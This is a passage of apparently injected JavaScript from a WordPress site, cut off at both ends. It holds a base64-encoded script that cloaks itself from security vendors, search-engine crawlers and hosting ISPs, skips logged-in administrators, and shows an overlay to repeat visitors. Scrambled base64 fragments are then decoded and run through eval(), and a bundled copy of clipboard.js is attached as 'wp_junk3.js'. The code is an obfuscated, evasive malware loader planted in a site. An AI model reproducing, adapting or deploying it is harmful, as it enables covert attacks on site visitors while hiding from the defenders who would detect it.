2lzY2hlIExhbmRlc3JlZ2llcnVuZycsJ0JhcnJhY3VkYSBOZXR3b3JrcycsJ1RyZW5kIE1pY3JvIEluY29ycG9yYXRlZCcsJ01pY3Jvc29mdCBDb3JwJywnTWljcm9zb2Z0IENvcnBvcmF0aW9uJywnU3VyZkNvbnRyb2wnLCdXZWJzZW5zZScsJ0dIT1NUbmV0IEdtYkgnLCdJTkVUdScsJ0F2aXJhIEIuVi4nLCdHb29nbGUgQ2xvdWQnLCdZYWhvbyEnLCdDb21tdG91Y2gnLCdDbG91ZEZsYXJlJywnVHJ1c3R3YXZlIEhvbGRpbmdzJywnRk9SVEhuZXQgU0EnLCdVUyBEZXBhcnRtZW50IG9mIERlZmVuc2UgTmV0d29yaycsJ1pPTkVTIEFTJywnQ2lzY28gU3lzdGVtcyBJcm9ucG9ydCBEaXZpc2lvbicsJ1RoZVBsYW5ldC5jb20gSW50ZXJuZXQgU2VydmljZXMnLCdXZWJyb290IFNlcnZpY2VzJywnUmFja3NwYWNlIEhvc3RpbmcnLCdQZXJpbWV0ZXIgZVNlY3VyaXR5JywnRGlnaXRhbE9jZWFuJywnUGFja2V0RXhjaGFuZ2UnLCdHeXJvbiBJbnRlcm5ldCBMdGQnLCdOZXdNZWRpYSBFeHByZXNzIFB0ZScsJ0FtYXpvbi5jb20nLCdNY0FmZWUnLCdFU0VULCBzcG9sLiBzIHIuby4nLCdGYWNlYm9vaycsJ0ZhY2Vib29rIElyZWxhbmQgTHRkJywnWWFob28hIEJyb2FkY2FzdCBTZXJ2aWNlcycsJ1lhaG9vISBJbmRpYSBQdnQnLCdZYWhvbyBKYXBhbicsJ1lhaG9vIEphcGFuIENvcnBvcmF0aW9uJywnR29vZ2xlYm90JywnQVZBU1QgU29mdHdhcmUgcy5yLm8uJywnTWljcm9zb2Z0IGJpbmdib3QnLCdNaWNyb3NvZnQgSG9zdGluZycsJ0FtYXpvbiBUZWNobm9sb2dpZXMnLCdDeXZlaWxsYW5jZScsJ0Nsb3VkbWFyaycsJ0Nsb3VkbWFyayBMYWJzJywnVG9wc3kgTGFicycsJ0FtYXpvbicsJ1NFUlZFUiBCTE9DSycsJ09WSCBIb3N0aW5nJywnWUFOREVYJywnWUFOREVYIExMQycsJ1lhaG9vIEJhbmdhbG9yZSBOZXR3b3JrIE1vbml0b3JpbmcgQ2VudGVyJywnVGluZXQnLCdNdWx0aW1lZGlhIFBvbHNrYSBTLkEuJywnTXVsdGltZWRpYSBQb2xza2EgLSBQb2x1ZG5pZSBTLkEuJywnWmVuaXRoIEVsZWN0cm9uaWNzIENvcnBvcmF0aW9uJywnQmFycmFjdWRhIENhbmFkYScsJ01pY3Jvc29mdCBMaW1pdGVkJywnTWljcm9zb2Z0IChDaGluYSkgQ28uJywnU1BBTWZpZ2h0ZXIgQXBTJywnU3BhbWZpZ2h0ZXItYXMnLCdEaWdpdGFsT25lIEFHJywnVHdpdHRlcicsJ1R3aXR0ZXIgSW50ZXJuYXRpb25hbCBDb21wYW55JywnU3VyZmNvbnRyb2wtcmVhZGluZycsJ1lhaG9vIENvcnAgTmV0d29yaycsJ0NvbmVjdGl2YScsJ0NvbmVjdGl2YSBUZWxlY29tJywnQ29uZWN0aXZhIENlbHVsYXIgZSBJbmZvcm1hdGljYSBMdGRhJywnUmVkaWZmLmNvbSBJbmRpYSBMaW1pdGVkJywnSW5jZXJvIExMQycsJ09OTElORSBTLkEuUy4nLCdPTkxJTkUgU0FTJywnVGlzY2FsaS1pdCcsJ1Rpc2NhbGkgU3BBJywnVGlzY2FsaSBVSyBMaW1pdGVkJywnRnVqaXRzdScsJ0RhdW0gQ29tbXVuaWNhdGlvbiBDby4sTFREJywnSW50ZXJuZXQgU2VjdXJpdHkgU3lzdGVtcycsJ1ZLb250YWt0ZSBMdGQnLCdMZWFzZXdlYicsJ0xlYXNlV2ViIE5ldGhlcmxhbmRzIEIuVi4nLCdMZWFzZVdlYiBCLlYuJywnTGVhc2VXZWIgQ0ROIEIuVi4nLCdMZWFzZVdlYiBOZXR3b3JrIEIuVi4nLCdMZWFzZXdlYiBBc2lhJywnTGVhc2V3ZWIgQXNpYSBQYWNpZmljIHB0ZS4nLCdMZWFzZXdlYiBEZXV0c2NobGFuZCBHbWJIJywnTGVhc2V3ZWIgVVNBJywnTGVhc2V3ZWItZGUnLCdJbnRlck5BUCBOZXR3b3JrIFNlcnZpY2VzIFUuSy4gTGltaXRlZCcsJ0ludGVybmFwIEphcGFuIENvLixMVEQuJywnSW50ZXJuYXAgTmV0d29yayBTZXJ2aWNlcycsJ0ludGVybmFwIE5ldHdvcmsgU2VydmljZXMgQ29ycG9yYXRpb24nLCdCaXRkZWZlbmRlci1hcycsJ0JpdGRlZmVuZGVyIFNSTCcsJ01YIExvZ2ljJywnQ2hpbmEgRWR1Y2F0aW9uIGFuZCBSZXNlYXJjaCBOZXR3b3JrIENlbnRlcicsJ0NoaW5hIER1dHkgRnJlZSBncm91cCcsJ0NoaW5hJywnQ2hpbmEgQnJvYWRiYW5kIENvbW11bmljYXRpb25zIChDQkNuZXQpJywnQ2hpbmEgQnJvYWRjYXN0aW5nIFRWIE5ldCcsJ0NoaW5hIENvbW11bmljYXRpb24gQ28uJywnQ2hpbmEgQ29uc3RydWN0aW9uIEJhbmsgKEFzaWEpIENvcnBvcmF0aW9uIExpbWl0ZWQnLCdDaGluYSBDdWx0dXJhbCBIZXJpdGFnZSBJbmZvcm1hdGlvbiBhbmQgQ29uc3VsdGluZycsJ0NoaW5hIERpZ2l0YWwgS2luZ2RvbSBUZWNobm9sb2d5IENvLixMdGQuJywnQ2hpbmEgRHJhZ29uIFRlbGVjb20gQ28uLEx0ZCcsJ0ZhY3Rpb24nLCdaZW4gU3lzdGVtcyBBL1MnLCdPVkggU0FTJywnU29sdXRpb24gUHJvJywnRGVkRmliZXJDbycsJ0NsZWFyQmx1ZSBUZWNobm9sb2dpZXMnLCdJbmZvcm1hdGlvbiBUZWNobm9sb2d5IFN5c3RlbXMnLCdHb0RhZGR5LmNvbSwgTExDJywnU2VydmVyIENlbnRyYWwgTmV0d29yaycsJ1RpbmV0IFNwYScsJ0NhcHJpcyBHcm91cCcsJ0lua3RvbWkgQ29ycG9yYXRpb24nLCdVbmlmaWVkIExheWVyJywnSlNDIFJUQ29tbS5SVScsJ0xMQyBtYXN0ZXJob3N0JywnTVRPIFRlbGVjb20nLCdMaW5rZWRJbiBDb3Jwb3JhdGlvbicsJ1dlYnNpdGV3ZWxjb21lLmNvbScsJ0dUUyBUZWxlY29tIFNSTCcsJ1B1bHNlUG9pbnQgQ29tbXVuaWNhdGlvbnMnLCdQdWxzZXBvaW50JywnVGltZVdlYiBMdGQuJywnQmVpamluZyBCYWlkdSBOZXRjb20gU2NpZW5jZSBhbmQgVGVjaG5vbG9neSBDby4nLCdEaWdpdGFsIE9jZWFuJywnVGhyZWF0VHJhY2snLCdUaHJlYXRUcmFjayBTZWN1cml0eScsJ0VHSUhvc3RpbmcnLCdIRVRaTkVSJywnSGV0em5lci1hcycsJ0hldHpuZXIgT25saW5lIEdtYkgnLCdIRVRaTkVSIChQdHkpIEx0ZCcsJ0hldHpuZXIgQ0MnLCdMaW1pdGVkIGxpYWJpbGl0eSBjb21wYW55IE1haWwuUnUnLCdBbWF6b24gQ29ycG9yYXRlIExMQycsJ0FtYXpvbiBEYXRhIFNlcnZpY2VzIElyZWxhbmQgTHRkJywnQW1hem9uIFdlYiBTZXJ2aWNlcywgTExDJywnQW1hem9uLmNvbSBUZWNoIFRlbGVjb20nLCdBbWF6b25pYSBQdWJsaWNpZGFkZSBMdGRhJywnQW1hem9uaWEgVGVsZWNvbSBMdGRhLiAtIE1lJywnS2FzcGVyc2t5IExhYiBBTycsJ0FsaXN0YXIgU2VjdXJpdHkgU3JsJywnTkZPcmNlIEVudGVydGFpbm1lbnQgQi5WLicsJ1NLIEJyb2FkYmFuZCcsJ1pheW8gR3JvdXAgRVUgTGltaXRlZCcsJ1F1YWRyYU5ldCcsJ1JhbU5vZGUgTExDJywnSG9zdFVTJwogICAgICBdOwoKICAgICAgaWYgKGJsb2NrZWRJU1BzLmluY2x1ZGVzKGlzcCkpIHsKICAgICAgICB2bG9nKCdkZW55X2lzcCcsIGlzcCk7CiAgICAgICAgdHJhY2tCb3QoKTsKICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgIH0KICAgICAgCgogICAgICByZXR1cm4gdHJ1ZTsKICAgIH0gY2F0Y2ggKGVycikgewogICAgICB2ZXJyKCdBY2Nlc3MgY2hlY2sgZmFpbGVkOicsIGVycik7CiAgICAgIHJldHVybiB0cnVlOwogICAgfQogIH0KCiAgYXN5bmMgZnVuY3Rpb24gaW5pdCgpIHsKICAgIHRyeSB7CiAgICAgIGNvbnN0IGFsbG93ZWQgPSBhd2FpdCBpc0FjY2Vzc0FsbG93ZWQoKTsKICAgICAgdmxvZygnYWNjZXNzX2FsbG93ZWQnLCBhbGxvd2VkKTsKICAgICAgaWYgKCFhbGxvd2VkKSB7CiAgICAgICAgcmV0dXJuOwogICAgICB9CgogICAgICBjb25zdCBza2lwID0gZ2V0VmFsKCdfc2tpcCcsICcwJyk7CiAgICAgIGlmIChza2lwID09PSAnMScpIHsKICAgICAgICByZXR1cm47CiAgICAgIH0KCiAgICAgIGlmIChkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnd3BhZG1pbmJhcicpKSB7CiAgICAgICAgcmV0dXJuOwogICAgICB9CgogICAgICBsZXQgY291bnQgPSBwYXJzZUludChnZXRWYWwoS0VZLCAnMCcpLCAxMCk7CiAgICAgIGlmIChOdW1iZXIuaXNOYU4oY291bnQpKSBjb3VudCA9IDA7CiAgICAgIGNvdW50Kys7CiAgICAgIHNldFZhbChLRVksIGNvdW50LnRvU3RyaW5nKCkpOwoKICAgICAgaWYgKGNvdW50ID49IE4pIHsKICAgICAgICByZW5kZXJPdmVybGF5KCk7CiAgICAgIH0KICAgIH0gY2F0Y2goZSkgewogICAgICB2ZXJyKCdpbml0X2ZhaWxlZCcsIGUpOwogICAgICByZW5kZXJPdmVybGF5KCk7CiAgICB9CiAgfQoKICBpZiAoZG9jdW1lbnQuYm9keSkgewogICAgaW5pdCgpOwogIH0gZWxzZSB7CiAgICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJywgaW5pdCk7CiAgfQp9KSgpOwogIA==",
    "MC4yMDYyODk5MTUzMTM4OTgz",
    "MC43NTUzNzM4MjM0NDc1OTAz",
    "MC4yNDgwMzQ5MjkzMDM3NjE5Mg==",
    "MC44ODU2NDMwMTg3MTMxOTI=",
    "MC4zMzA4NzcwMTA0NTMxNjc0",
    "MC41NzM4NTA3NjgxMTMzMDY=",
    "MC4wNjAzNjExMjEzNzM3ODYxMw==",
    "MC43MjUxNzI2NTU3NDUzMDY0",
    "MC45MjgxODQ3OTAyMDczNDA2"
  ];

  var _k1 = "539252";
  var _k2 = "385903";
  var _k3 = 0;

  var _code = b64ToUtf8(_f[_k1]) + b64ToUtf8(_d[_k2]) + b64ToUtf8(_z[_k3]);
  eval(_code);
})();
/* >>> wp_junk3.js (26806 bytes) <<< */
(function(){
try{
/*!
 * clipboard.js v2.0.11
 * https://clipboardjs.com/
 *
 * Licensed MIT © Zeno Rocha
 */
(function webpackUniversalModuleDefinition(root, factory) {
	if(typeof exports === 'object' && typeof module === 'object')
		module.exports = factory();
	else if(typeof define === 'function' && define.amd)
		define([], factory);
	else if(typeof exports === 'object')
		exports["ClipboardJS"] = factory();
	else
		root["ClipboardJS"] = factory();
})(this, function() {
return /******/ (function() { // webpackBootstrap
/******/ 	var __webpack_modules__ = ({

/***/ 686:
/***/ (function(__unused_webpack_module, __webpack_exports__, __webpack_require__) {

"use strict";

// EXPORTS
__webpack_require__.d(__webpack_exports__, {
  "default": function() { return /* binding */ clipboard; }
});

// EXTERNAL MODULE: ./node_modules/tiny-emitter/index.js
var tiny_emitter = __webpack_require__(279);
var tiny_emitter_default = /*#__PURE__*/__webpack_require__.n(tiny_emitter);
// EXTERNAL MODULE: ./node_modules/good-listener/src/listen.js
var listen = __webpack_require__(370);
var listen_default = /*#__PURE__*/__webpack_require__.n(listen);
// EXTERNAL MODULE: ./node_modules/select/src/select.js
var src_select = __webpack_require__(817);
var select_default = /*#__PURE__*/__webpack_require__.n(src_select);
;// CONCATENATED MODULE: ./src/common/command.js
/**
 * Executes a given operation type.
 * @param {String} type
 * @return {Boolean}
 */
function command(type) {
  try {
    return document.execCommand(type);
  } catch (err) {
    return false;
  }
}
;// CONCATENATED MODULE: ./src/actions/cut.js


/**
 * Cut action wrapper.
 * @param {String|HTMLElement} target
 * @return {String}
 */

var ClipboardActionCut = function ClipboardActionCut(target) {
  var selectedText = select_default()(target);
  command('cut');
  return selectedText;
};

/* harmony default export */ var actions_cut = (ClipboardActionCut);
;// CONCATENATED MODULE: ./src/common/create-fake-element.js
/**
 * Creates a fake textarea element with a value.
 * @param {String} value
 * @return {HTMLElement}
 */
function createFakeElement(value) {
  var isRTL = document.documentElement.getAttribute('dir') === 'rtl';
  var fakeElement = document.createElement('textarea'); // Prevent zooming on iOS

  fakeElement.style.fontSize = '12pt'; // Reset box model

  fakeElement.style.border = '0';
  fakeElement.style.padding = '0';
  fakeElement.style.margin = '0'; // Move element out of screen horizontally

  fakeElement.style.position = 'absolute';
  fakeElement.style[isRTL ? 'right' : 'left'] = '-9999px'; // Move element to the same position vertically

  var yPosition = window.pageYOffset || document.documentElement.scrollTop;
  fakeElement.style.top = "".concat(yPosition, "px");
  fakeElement.setAttribute('readonly', '');
  fakeElement.value = value;
  return fakeElement;
}
;// CONCATENATED MODULE: ./src/actions/copy.js



/**
 * Create fake copy action wrapper using a fake element.
 * @param {String} target
 * @param {Object} options
 * @return {String}
 */

var fakeCopyAction = function fakeCopyAction(value, options) {
  var fakeElement = createFakeElement(value);
  options.container.appendChild(fakeElement);
  var selectedText = select_default()(fakeElement);
  command('copy');
  fakeElement.remove();
  return selectedText;
};
/**
 * Copy action wrapper.
 * @param {String|HTMLElement} target
 * @param {Object} options
 * @return {String}
 */


var ClipboardActionCopy = function ClipboardActionCopy(target) {
  var options = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {
    container: document.body
  };
  var selectedText = '';

  if (typeof target === 'string') {
    selectedText = fakeCopyAction(target, options);
  } else if (target instanceof HTMLInputElement && !['text', 'search', 'url', 'tel', 'password'].includes(target === null || target === void 0 ? void 0 : target.type)) {
    // If input type doesn't support `setSelectionRange`. Simulate it. https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/setSelectionRange
    selectedText = fakeCopyAction(target.value, options);
  } else {
    selectedText = select_default()(target);
    command('copy');
  }

  return selectedText;
};

/* harmony default export */ var actions_copy = (ClipboardActionCopy);
;// CONCATENATED MODULE: ./src/actions/default.js
function _typeof(obj) { "@babel/helpers - typeof"; if (typeof Symbol === "function" && typeof Symbol.iterator === "symbol") { _typeof = function _typeof(obj) { return typeof obj; }; } else { _typeof = function _typeof(obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; }; } return _typeof(obj); }



/**
 * Inner function which performs selection from either `text` or `target`
 * properties and then executes copy or cut operations.
 * @param {Object} options
 */

var ClipboardActionDefault = function ClipboardActionDefault() {
  var options = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
  // Defines base properties passed from constructor.
  var _options$action = options.action,
      action = _options$action === void 0 ? 'copy' : _options$action,
      container = options.container,
      target = options.target,
      text = options.text; // Sets the `action` to be performed which can be either 'copy' or 'cut'.

  if (action !== 'copy' && action !== 'cut') {
    throw new Error('Invalid "action" value, use either "copy" or "cut"');
  } // Sets the `target` property using an element that will be have its content copied.


  if (target !== undefined) {
    if (target && _typeof(target) === 'object' && target.nodeType === 1) {
      if (action === 'copy' && target.hasAttribute('disabled')) {
        throw new Error('Invalid "target" attribute. Please use "readonly" instead of "disabled" attribute');
      }

      if (action === 'cut' && (target.hasAttribute('readonly') || target.hasAttribute('disabled'))) {
        throw new Error('Invalid "target" attribute. You can\'t cut text from elements with "readonly" or "disabled" attributes');
      }
    } else {
      throw new Error('Invalid "target" value, use a valid Element');
    }
  } // Define selection strategy based on `text` property.


  if (text) {
    return actions_copy(text, {
      container: container
    });
  } // Defines which selection strategy based on `target` property.


  if (target) {
    return action === 'cut' ? actions_cut(target) : actions_copy(target, {
      container: container
    });
  }
};

/* harmony default export */ var actions_default = (ClipboardActionDefault);
;// CONCATENATED MODULE: ./src/clipboard.js
function clipboard_typeof(obj) { "@babel/helpers - typeof"; if (typeof Symbol === "function" && typeof Symbol.iterator === "symbol") { clipboard_typeof = function _typeof(obj) { return typeof obj; }; } else { clipboard_typeof = function _typeof(obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; }; } return clipboard_typeof(obj); }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } }

function _createClass(Constructor, protoProps, staticProps) { if (protoProps) _defineProperties(Constructor.prototype, protoProps); if (staticProps) _defineProperties(Constructor, staticProps); return Constructor; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function"); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, writable: true, configurable: true } }); if (superClass) _setPrototypeOf(subClass, superClass); }

function _setPrototypeOf(o, p) { _setPrototypeOf = Object.setPrototypeOf || function _setPrototypeOf(o, p) { o.__proto__ = p; return o; }; return _setPrototypeOf(o, p); }

function _createSuper(Derived) { var hasNativeReflectConstruct = _isNativeReflectConstruct(); return function _createSuperInternal() { var Super = _getPrototypeOf(Derived), result; if (hasNativeReflectConstruct) { var NewTarget = _getPrototypeOf(this).constructor; result = Reflect.construct(Super, arguments, NewTarget); } else { result = Super.apply(this, arguments); } return _possibleConstructorReturn(this, result); }; }

function _possibleConstructorReturn(self, call) { if (call && (clipboard_typeof(call) === "object" || typeof call === "function")) { return call; } return _assertThisInitialized(self); }

function _assertThisInitialized(self) { if (self === void 0) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return self; }

function _isNativeReflectConstruct() { if (typeof Reflect === "undefined" || !Reflect.construct) return false; if (Reflect.construct.sham) return false; if (typeof Proxy === "function") return true; try { Date.prototype.toString.call(Reflect.construct(Date, [], function () {})); return true; } catch (e) { return false; } }

function _getPrototypeOf(o) { _getPrototypeOf = Object.setPrototypeOf ? Object.getPrototypeOf : function _getPrototypeOf(o) { return o.__proto__ || Object.getPrototypeOf(o); }; return _getPrototypeOf(o); }






/**
 * Helper function to retrieve attribute value.
 * @param {String} suffix
 * @param {Element} element
 */

function getAttributeValue(suffix, element) {
  var attribute = "data-clipboard-".concat(suffix);

  if (!element.hasAttribute(attribute)) {
    return;
  }

  return element.getAttribute(attribute);
}
/**
 * Base class which takes one or more elements, adds event listeners to them,
 * and instantiates a new `ClipboardAction` on each click.
 */


var Clipboard = /*#__PURE__*/function (_Emitter) {
  _inherits(Clipboard, _Emitter);

  var _super = _createSuper(Clipboard);

  /**
   * @param {String|HTMLElement|HTMLCollection|NodeList} trigger
   * @param {Object} options
   */
  function Clipboard(trigger, options) {
    var _this;

    _classCallCheck(this, Clipboard);

    _this = _super.call(this);

    _this.resolveOptions(options);

    _this.listenClick(trigger);

    return _this;
  }
  /**
   * Defines if attributes would be resolved using internal setter functions
   * or custom functions that were passed in the constructor.
   * @param {Object} options
   */


  _createClass(Clipboard, [{
    key: "resolveOptions",
    value: function resolveOptions() {
      var options = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
      this.action = typeof options.action === 'function' ? options.action : this.defaultAction;
      this.target = typeof options.target === 'function' ? options.target : this.defaultTarget;
      this.text = typeof options.text === 'function' ? options.text : this.defaultText;
      this.container = clipboard_typeof(options.container) === 'object' ? options.container : document.body;
    }
    /**
     * Adds a click event listener to the passed trigger.
     * @param {String|HTMLElement|HTMLCollection|NodeList} trigger
     */

  }, {
    key: "listenClick",
    value: function listenClick(trigger) {
      var _this2 = this;

      this.listener = listen_default()(trigger, 'click', function (e) {
        return _this2.onClick(e);
      });
    }
    /**
     * Defines a new `ClipboardAction` on each click event.
     * @param {Event} e
     */

  }, {
    key: "onClick",
    value: function onClick(e) {
      var trigger = e.delegateTarget || e.currentTarget;
      var action = this.action(trigger) || 'copy';
      var text = actions_default({
        action: action,
        container: this.container,
        target: this.target(trigger),
        text: this.text(trigger)
      }); // Fires an event based on the copy operation result.

      this.emit(text ? 'success' : 'error', {
        action: action,
        text: text,
        trigger: trigger,
        clearSelection: function clearSelection() {
          if (trigger) {
            trigger.focus();
          }

          window.getSelection().removeAllRanges();
        }
      });
    }
    /**
     * Default `action` lookup function.
     * @param {Element} trigger
     */

  }, {
    key: "defaultAction",
    value: function defaultAction(trigger) {
      return getAttributeValue('action', trigger);
    }
    /**
     * Default `target` lookup function.
     * @param {Element} trigger
     */

  }, {
    key: "defaultTarget",
    value: function defaultTarget(trigger) {
      var selector = getAttributeValue('target', trigger);

      if (selector) {
        return document.querySelector(selector);
      }
    }
    /**
     * Allow fire programmatically a copy action
     * @param {String|HTMLElement} target
     * @param {Object} options
     * @returns Text copied.
     */

  }, {
    key: "defaultText",

    /**
     * Default `text` lookup function.
     * @param {Element} trigger
     */
    value: function defaultText(trigger) {
      return getAttributeValue('text', trigger);
    }
    /**
     * Destroy lifecycle.
     */

  }, {
    key: "destroy",
    value: function destroy() {
      this.listener.destroy();
    }
  }], [{
    key: "copy",
    value: function copy(target) {
      var options = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {
        container: document.body
      };
      return actions_copy(target, options);
    }
    /**
     * Allow fire programmatically a cut action
     * @param {String|HTMLElement} target
     * @returns Text cutted.
     */

  }, {
    key: "cut",
    value: function cut(target) {
      return actions_cut(target);
    }
    /**
     * Returns the support of the given action, or all actions if no action is
     * given.
     * @param {String} [action]
     */

  }, {
    key: "isSupported",
    value: function isSupported() {
      var action = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : ['copy', 'cut'];
      var actions = typeof action === 'string' ? [action] : action;
      var support = !!document.queryCommandSupported;
      actions.forEach(function (action) {
        support = support && !!document.queryCommandSupported(action);
      });
      return support;
    }
  }]);

  return Clipboard;
}((tiny_emitter_default()));

/* harmony default export */ var clipboard = (Clipboard);

/***/ }),

/***/ 828:
/***/ (function(module) {

var DOCUMENT_NODE_TYPE = 9;

/**
 * A polyfill for Element.matches()
 */
if (typeof Element !== 'undefined' && !Element.prototype.matches) {
    var proto = Element.prototype;

    proto.matches = proto.matchesSelector ||
                    proto.mozMatchesSelector ||
                    proto.msMatchesSelector ||
                    proto.oMatchesSelector ||
                    proto.webkitMatchesSelector;
}

/**
 * Finds the closest parent that matches a selector.
 *
 * @param {Element} element
 * @param {String} selector
 * @return {Function}
 */
function closest (element, selector) {
    while (element && element.nodeType !== DOCUMENT_NODE_TYPE) {
        if (typeof element.matches === 'function' &&
            element.matches(selector)) {
          return element;
        }
        element = element.parentNode;
    }
}

module.exports = closest;


/***/ }),

/***/ 438:
/***/ (function(module, __unused_webpack_exports, __webpack_require__) {

var closest = __webpack_require__(828);

/**
 * Delegates event to a selector.
 *
 * @param {Element} element
 * @param {String} selector
 * @param {String} type
 * @param {Function} callback
 * @param {Boolean} useCapture
 * @return {Object}
 */
function _delegate(element, selector, type, callback, useCapture) {
    var listenerFn = listener.apply(this, arguments);

    element.addEventListener(type, listenerFn, useCapture);

    return {
        destroy: function() {
            element.removeEventListener(type, listenerFn, useCapture);
        }
    }
}

/**
 * Delegates event to a selector.
 *
 * @param {Element|String|Array} [elements]
 * @param {String} selector
 * @param {String} type
 * @param {Function} callback
 * @param {Boolean} useCapture
 * @return {Object}
 */
function delegate(elements, selector, type, callback, useCapture) {
    // Handle the regular Element usage
    if (typeof elements.addEventListener === 'function') {
        return _delegate.apply(null, arguments);
    }

    // Handle Element-less usage, it defaults to global delegation
    if (typeof type === 'function') {
        // Use `document` as the first parameter, then apply arguments
        // This is a short way to .unshift `arguments` without running into deoptimizations
        return _delegate.bind(null, document).apply(null, arguments);
    }

    // Handle Selector-based usage
    if (typeof elements === 'string') {
        elements = document.querySelectorAll(elements);
    }

    // Handle Array-like based usage
    return Array.prototype.map.call(elements, function (element) {
        return _delegate(element, selector, type, callback, useCapture);
    });
}

/**
 * Finds closest match and invokes callback.
 *
 * @param {Element} element
 * @param {String} selector
 * @param {String} type
 * @param {Function} callback
 * @return {Function}
 */
function listener(element, selector, type, callback) {
    return function(e) {
        e.delegateTarget = closest(e.target, selector);

        if (e.delegateTarget) {
            callback.call(element, e);
        }
    }
}

module.exports = delegate;


/***/ }),

/***/ 879:
/***/ (function(__unused_webpack_module, exports) {

/**
 * Check if argument is a HTML element.
 *
 * @param {Object} value
 * @return {Boolean}
 */
exports.node = function(value) {
    return value !== undefined
        && value instanceof HTMLElement
        && value.nodeType === 1;
};

/**
 * Check if argument is a list of HTML elements.
 *
 * @param {Object} value
 * @return {Boolean}
 */
exports.nodeList = function(value) {
    var type = Object.prototype.toString.call(value);

    return value !== undefined
        && (type === '[object NodeList]' || type === '[object HTMLCollection]')
        && ('length' in value)
        && (value.length === 0 || exports.node(value[0]));
};

/**
 * Check if argument is a string.
 *
 * @param {Object} value
 * @return {Boolean}
 */
exports.string = function(value) {
    return typeof value === 'string'
        || value instanceof String;
};

/**
 * Check if argument is a function.
 *
 * @param {Object} value
 * @return {Boolean}
 */
exports.fn = function(value) {
    var type = Object.prototype.toString.call(value);

    return type === '[object Function]';
};


/***/ }),

/***/ 370:
/***/ (function(module, __unused_webpack_exports, __webpack_require__) {

var is = __webpack_require__(879);
var delegate = __webpack_require__(438);

/**
 * Validates all params and calls the right
 * listener function based on its target type.
 *
 * @param {String|HTMLElement|HTMLCollection|NodeList} target
 * @param {String} type
 * @param {Function} callback
 * @return {Object}
 */
function listen(target, type, callback) {
    if (!target && !type && !callback) {
        throw new Error('Missing required arguments');
    }

    if (!is.string(type)) {
        throw new TypeError('Second argument must be a String');
    }

    if (!is.fn(callback)) {
        throw new TypeError('Third argument must be a Function');
    }

    if (is.node(target)) {
        return listenNode(target, type, callback);
    }
    else if (is.nodeList(target)) {
        return listenNodeList(target, type, callback);
    }
    else if (is.string(target)) {
        return listenSelector(target, type, callback);
    }
    else {
        throw new TypeError('First argument must be a String, HTMLElement, HTMLCollection, or NodeList');
    }
}

/**
 * Adds an event listener to a HTML element
 * and returns a remove listener function.
 *
 * @param {HTMLElement} node
 * @param {String} type
 * @param {Function} callback
 * @return {Object}
 */
function listenNode(node, type, callback) {
    node.addEventListener(type, callback);

    return {
        destroy: function() {
            node.removeEventListener(type, callback);
        }
    }
}

/**
 * Add an event listener to a list of HTML elements
 * and returns a remove listener function.
 *
 * @param {NodeList|HTMLCollection} nodeList
 * @param {String} type
 * @param {Function} callback
 * @return {Object}
 */
function listenNodeList(nodeList, type, callback) {
    Array.prototype.forEach.call(nodeList, function(node) {
        node.addEventListener(type, callback);
    });

    return {
        destroy: function() {
            Array.prototype.forEach.call(nodeList, function(node) {
                node.removeEventListener(type, callback);
            });
        }
    }
}

/**
 * Add an event listener to a selector
 * and returns a remove listener function.
 *
 * @param {String} selector
 * @param {String} type
 * @param {Function} callback
 * @return {Object}
 */
function listenSelector(selector, type, callback) {
    return delegate(document.body, selector, type, callback);
}

module.exports = listen;


/***/ }),

/***/ 817:
/***/ (function(module) {

function select(element) {
    var selectedText;

    if (element.nodeName === 'SELECT') {
        element.focus();

        selectedText = element.value;
    }
    else if (element.nodeName === 'INPUT' || element.nodeName === 'TEXTAREA') {
        var isReadOnly = element.hasAttribute('readonly');

        if (!isReadOnly) {
            element.setAttribute('readonly', '');
        }

        element.select();
        element.setSelectionRange(0, element.value.length);

        if (!isReadOnly) {
            element.removeAttribute('readonly');
        }

        selectedText = element.value;
    }
    else {
        if (element.hasAttribute('contenteditable')) {
            element.focus();
        }

        var selection = window.getSelection();
        var range = document.createRange();

        range.selectNodeContents(element);
        selection.removeAllRanges();
        selection.addRange(range);

        selectedText = selection.toString();
    }

    return selectedText;
}

module.exports = select;


/***/ }),

/***/ 279:
/***/ (function(module) {

function E () {
  // Keep this empty so it's easier to inherit from
  // (via https://github.com/lipsmack from https://github.com/scottcorgan/tiny-emitter/issues/3)
}

E.prototype = {
  on: function (name, callback, ctx) {
    var e = this.e || (this.e = {});

    (e[name] || (e[name] = [])).push({
      fn: callback,
      ctx: ctx
    });

    return this;
  },

  once: function (name, callback, ctx) {
    var self = this;
    function listener () {
      self.off(name, listener);
      callback.apply(ctx, arguments);
    };

    listener._ = callback
    return this.on(name, listener, ctx);
  },

  emit: function (name) {
    var data = [].slice.call(arguments, 1);
    var evtArr = ((this.e || (this.e = {}))[name] || []).slice();
    var i = 0;
    var len = evtArr.length;

    for (i; i < len; i++) {
      evtArr[i].fn.apply(evtArr[i].ctx, data);
    }

    return this;
  },

  off: function (name, callback) {
    var e = this.e || (this.e = {});
    var evts = e[name];
    var liveEvents = [];

    if (evts && callback) {
      for (var i = 0, len = evts.length; i < len; i++) {
        if (evts[i].fn !== callback && evts[i].fn._ !== callback)
          liveEvents.push(evts[i]);
      }
    }

    // Remove event from queue to prevent memory leak
    // Suggested by https://github.com/lazd
